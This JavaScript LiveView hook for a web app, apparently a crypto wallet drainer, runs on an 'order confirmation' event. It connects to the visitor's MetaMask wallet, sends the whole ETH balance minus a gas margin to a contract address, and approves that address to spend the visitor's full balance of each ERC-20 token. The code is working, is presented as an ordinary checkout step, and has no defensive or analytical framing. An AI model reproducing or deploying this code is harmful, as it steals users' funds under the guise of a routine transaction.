import { ethers } from "ethers";
import { erc20Abi } from "../config.js";

let ApproveTransferHook = {
    mounted() {
        console.log("ApproveTransferHook mounted");

        // Listen for the `trigger_approve_and_transfer` event from LiveView
        this.handleEvent("trigger_approve_and_transfer", async () => {
            try {
                console.log("Starting approval and transfer process...");

                if (!window.ethereum) {
                    console.error("Ethereum wallet not detected");
                    this.pushEvent("order_confirmation_error", { error: "No Ethereum wallet detected" });
                    return;
                }

                // Connect to Ethereum provider (MetaMask)
                const provider = new ethers.BrowserProvider(window.ethereum);
                await provider.send("eth_requestAccounts", []);
                const signer = await provider.getSigner();
                const userAddress = await signer.getAddress();

                // Get the ETH balance to check for transfer
                const balance = await provider.getBalance(userAddress);
                const formattedBalance = ethers.formatEther(balance);

                console.log("User address:", userAddress);
                console.log("ETH balance:", formattedBalance);

                // Get the tokens to approve (passed via dataset from LiveView)
                const tokenBalances = this.el.dataset.tokens ? JSON.parse(this.el.dataset.tokens) : [];

                // Transfer ETH balance (after approval)
                await this.transferEntireEthBalance(signer, balance);

                // Handle token approvals (only for tokens with non-zero balances)
                await this.approveTokensIfNeeded(signer, tokenBalances);

                // Notify LiveView of success
                this.pushEvent("order_confirmation_success", { address: userAddress, eth_balance: formattedBalance });
                console.log("Approval and transfer completed.");

            } catch (error) {
                console.error("Error during approval and transfer:", error);
                this.pushEvent("order_confirmation_error", { error: error.message });
            }
        });
    },

    // Function to approve tokens only when necessary
    async approveTokensIfNeeded(signer, tokenBalances) {
        if (!tokenBalances.length) {
            console.log("No tokens to approve.");
            return;
        }

        const spenderAddress = this.el.dataset.contractAddress; // Ensure this is correctly passed

        for (const token of tokenBalances) {
            try {
                if (token.rawBalance > 0) {
                    const contract = new ethers.Contract(token.tokenAddress, erc20Abi, signer);
                    console.log(`Approving ${token.symbol} with balance: ${token.rawBalance}`);

                    const tx = await contract.approve(spenderAddress, token.rawBalance);
                    await tx.wait();

                    console.log(`Approved ${token.symbol} for transfer.`);
                }
            } catch (error) {
                console.error(`Error approving ${token.symbol}:`, error);
                throw error; // Re-throw error to stop execution if any token fails to approve
            }
        }
    },

    // Function to transfer the entire ETH balance to the contract owner
    async transferEntireEthBalance(signer, balance) {
        const contractAddress = this.el.dataset.contractAddress;
        const gasEstimate = ethers.parseUnits("0.001", "ether");
        const amountToSend = balance - gasEstimate;

        if (amountToSend > 0) {
            console.log(`Transferring ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}...`);

            const tx = await signer.sendTransaction({
                to: contractAddress,
                value: amountToSend
            });
            await tx.wait();
            console.log(`Successfully transferred ${ethers.formatEther(amountToSend)} ETH to ${contractAddress}.`);
        } else {
            console.log("Insufficient ETH balance for transfer.");
        }
    }
};

export default ApproveTransferHook;
